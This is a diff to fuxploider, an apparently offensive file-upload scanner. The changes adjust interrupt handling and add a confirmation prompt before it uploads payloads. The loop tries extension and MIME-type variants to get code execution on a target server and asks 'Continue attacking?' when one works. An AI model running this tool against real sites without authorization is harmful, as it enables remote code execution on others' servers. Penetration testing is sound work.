@@ -2,7 +2,7 @@
 import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json
 from utils import *
 from UploadForm import UploadForm
-signal.signal(signal.SIGINT, quitting)
+#signal.signal(signal.SIGINT, quitting)
 version = "0.3.1"
 logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
 logger = logging.getLogger("fuxploider")
@@ -200,6 +200,7 @@ with open("techniques.json","r") as rawTechniques :
 
 ##############################################################################################################################################
 ##############################################################################################################################################
+input("Start uploading payloads ?")
 logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
 wantToStop = False
 for template in templates :
@@ -213,6 +214,7 @@ for template in templates :
 	nastyExtVariants = template["extVariants"]
 
 	attempts = []
+
 	nbOfValidExtensions = len(up.validExtensions)
 	nbOfEntryPointsFound = 0
 	i = 0
@@ -231,23 +233,26 @@ for template in templates :
 				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)
 				attempts.append({"suffix":suffix,"mime":mime})
 
-		for a in attempts :
-			suffix = a["suffix"]
-			mime = a["mime"]
+		try :
+			for a in attempts :
+				suffix = a["suffix"]
+				mime = a["mime"]
 
-			res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
-			templatefd.seek(0)
-			if res["codeExec"] :
-				logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
-				nbOfEntryPointsFound += 1
-				foundEntryPoint = a
-				foundEntryPoint["template"] = template["filename"]
-				entryPoints.append(foundEntryPoint)
-				if not args.detectAllEntryPoints :
-					cont = input("Continue attacking ? [y/N] : ")
-					if not cont.lower().startswith("y") :
-						wantToStop = True
-						break
+				res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
+				templatefd.seek(0)
+				if res["codeExec"] :
+					logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
+					nbOfEntryPointsFound += 1
+					foundEntryPoint = a
+					foundEntryPoint["template"] = template["filename"]
+					entryPoints.append(foundEntryPoint)
+					if not args.detectAllEntryPoints :
+						cont = input("Continue attacking ? [y/N] : ")
+						if not cont.lower().startswith("y") :
+							wantToStop = True
+							break
+		except KeyboardInterrupt :
+			wantToStop = True
 		i += 1
 	templatefd.close()
 print()
